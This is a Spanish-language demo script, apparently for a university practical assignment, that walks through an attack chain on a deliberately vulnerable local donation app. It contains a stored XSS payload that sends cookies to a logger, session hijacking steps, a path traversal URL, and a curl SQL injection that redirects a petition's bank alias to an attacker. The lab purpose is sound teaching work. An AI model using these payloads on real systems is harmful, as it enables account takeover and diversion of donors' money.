@@ -1,0 +1,184 @@
+================================================================================
+  DEMO KILL CHAIN - Plataforma de Donaciones Comunitarias
+  Que hacer con la app corriendo
+================================================================================
+
+ANTES DE EMPEZAR (una sola vez)
+-------------------------------
+1. En la carpeta del proyecto, con el entorno activado:
+     python seed.py
+2. Levantar la app (Terminal 1):
+     uvicorn main:app --reload
+3. Abrir en el navegador: http://127.0.0.1:8000
+4. Levantar el capturador de cookies (Terminal 2, dejarlo abierto):
+     python tools/cookie_logger.py
+   Debe decir: Escuchando en http://127.0.0.1:9000/log?cookie=...
+
+Necesitas DOS navegadores o perfiles distintos:
+  - Navegador A = ATACANTE (usuario martin)
+  - Navegador B = VICTIMA / ADMIN (usuario admin)
+
+CREDENCIALES
+------------
+  Atacante:  martin  /  martin123
+  Admin:     admin   /  admin
+
+Peticion clave de la demo:
+  "Jornada comunitaria para limpiar el Riachuelo"
+  (entrar desde el inicio y abrirla, o buscarla en la lista)
+
+Alias bancario original de esa peticion (para comparar al final):
+  RIACHUELO.LIMPIO.MP
+
+
+================================================================================
+PASO 1 - Stored XSS (Navegador A, atacante)
+================================================================================
+
+1. Entrar: http://127.0.0.1:8000/login
+   Usuario: martin
+   Password: martin123
+
+2. Abrir la peticion del Riachuelo.
+
+3. En "Comentar", pegar EXACTAMENTE esto y publicar:
+
+   <script>fetch('http://127.0.0.1:9000/log?cookie=' + document.cookie)</script>
+
+4. Recargar la pagina: el comentario no debe verse como texto plano
+   (el script queda guardado pero no se muestra).
+
+5. Verificar Terminal 2: todavia NO debe haber cookie (nadie ejecuto el script).
+
+
+================================================================================
+PASO 2 - Secuestro de sesion (Navegador B admin, luego Navegador A)
+================================================================================
+
+PARTE A - La victima ejecuta el XSS (Navegador B)
+-------------------------------------------------
+1. Entrar como admin / admin en http://127.0.0.1:8000/login
+
+2. Abrir la MISMA peticion del Riachuelo.
+
+3. Mirar Terminal 2 (cookie_logger). Debe aparecer algo como:
+   session=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+4. Copiar el valor completo de la cookie (todo lo que imprime, o solo
+   el token despues de "session=" si vas a pegarlo en el campo valor).
+
+PARTE B - El atacante usa la cookie robada (Navegador A)
+--------------------------------------------------------
+1. En el navegador donde seguis logueado como martin, abrir DevTools:
+   - Chrome/Edge: F12 -> Application -> Cookies -> http://127.0.0.1:8000
+   - Firefox: F12 -> Almacenamiento -> Cookies
+
+2. Buscar la cookie llamada "session".
+
+3. Reemplazar su valor por el token robado del admin.
+
+4. Recargar cualquier pagina de la app.
+
+5. Debe aparecer el enlace "Admin" en el menu y poder entrar a:
+   http://127.0.0.1:8000/admin
+
+   Ya tenes privilegios de administrador sin conocer la password de admin.
+
+
+================================================================================
+PASO 3 - Path traversal y reconocimiento (sigue en /admin como "admin")
+================================================================================
+
+1. En el panel admin, bajar hasta "Descarga de Logs de Actividad".
+
+2. Clic en "errors.log" (o abrir en el navegador):
+   http://127.0.0.1:8000/admin/logs/download?file=errors.log
+
+3. En el texto del log, buscar la ruta:
+   /var/www/app/main.py
+   (confirma que el backend es Python/FastAPI)
+
+4. En la barra de direcciones, cambiar la URL a:
+   http://127.0.0.1:8000/admin/logs/download?file=../../var/www/app/main.py
+
+5. Debe mostrarse el codigo fuente de main.py.
+
+6. En ese codigo, buscar (Ctrl+F):
+   legacy_mark_reviewed_77x9a
+
+   Anotar el endpoint:
+   POST /api/v2/legacy_mark_reviewed_77x9a
+
+
+================================================================================
+PASO 4 - SQLi y desvio de fondos (Postman, curl o similar)
+================================================================================
+
+Ya no hace falta el navegador para atacar; podes usar Postman o la terminal.
+
+URL:
+  POST http://127.0.0.1:8000/api/v2/legacy_mark_reviewed_77x9a
+
+Tipo de body: x-www-form-urlencoded
+
+Campo: petition_id
+Valor (copiar tal cual):
+
+  1; UPDATE petitions SET bank_alias = 'ATACANTE.DESVIO.MP' WHERE title LIKE '%Riachuelo%'; --
+
+Con curl (Terminal 3):
+
+  curl -X POST http://127.0.0.1:8000/api/v2/legacy_mark_reviewed_77x9a \
+    -d "petition_id=1; UPDATE petitions SET bank_alias = 'ATACANTE.DESVIO.MP' WHERE title LIKE '%Riachuelo%'; --"
+
+Verificar el impacto (navegador):
+---------------------------------
+1. Abrir de nuevo la peticion del Riachuelo:
+   http://127.0.0.1:8000/petitions/<id>
+   (el id suele ser 2 si corriste seed una vez; si no, mirar la URL al abrir la peticion)
+
+2. En el lateral debe decir:
+   Alias de cobro / CBU destino: ATACANTE.DESVIO.MP
+   (antes decia RIACHUELO.LIMPIO.MP)
+
+3. Opcional: en /admin, la tabla de peticiones tambien muestra el alias cambiado.
+
+
+================================================================================
+CHECKLIST RAPIDO (para la presentacion)
+================================================================================
+
+[ ] Terminal 1: uvicorn corriendo en :8000
+[ ] Terminal 2: cookie_logger corriendo en :9000
+[ ] seed.py ejecutado al menos una vez
+[ ] Paso 1: comentario XSS publicado por martin
+[ ] Paso 2: admin abre Riachuelo -> cookie en logger -> swap en DevTools -> /admin
+[ ] Paso 3: errors.log -> main.py -> endpoint legacy encontrado
+[ ] Paso 4: POST SQLi -> alias ATACANTE.DESVIO.MP visible en la peticion
+
+
+================================================================================
+PROBLEMAS FRECUENTES
+================================================================================
+
+- No llega la cookie al logger:
+  * Verificar que cookie_logger.py sigue corriendo.
+  * El admin debe VISITAR la peticion del Riachuelo despues del comentario XSS.
+  * Probar sin bloqueadores de scripts en el navegador del admin.
+
+- No aparece /admin despues del swap:
+  * La cookie debe llamarse exactamente "session".
+  * Pegar solo el token si copiaste "session=abc..." (el valor es solo abc...).
+
+- Path traversal da "Archivo no encontrado":
+  * Usar exactamente: file=../../var/www/app/main.py
+  * Estar logueado como admin (misma sesion robada).
+
+- El alias no cambia despues del SQLi:
+  * Volver a ejecutar seed.py si la base quedo inconsistente.
+  * Recargar la pagina de la peticion con F5.
+
+================================================================================
+Documento del TP: trabajo-practico-cuatrimestral.md
+Guia tecnica: README.md
+================================================================================
